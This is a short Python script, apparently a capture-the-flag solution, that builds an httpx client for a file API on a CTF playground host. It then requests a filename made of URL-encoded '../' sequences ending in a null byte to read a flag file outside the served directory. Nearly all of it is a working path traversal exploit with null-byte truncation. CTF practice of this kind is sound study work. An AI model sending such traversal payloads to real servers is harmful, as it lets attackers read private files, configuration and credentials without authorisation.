import httpx

URL = "http://playground.tcp1p.team:4823"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
    def api_files(self, content, filename):
        return self.c.post("/api/files", data={
            "filename": filename,
            "content": content,
        })
    def api_files_get(self, filename):
        return self.c.get(f"/api/files/{filename}")
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    res = api.api_files_get("..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fflag.flag%00")
    print(res.text)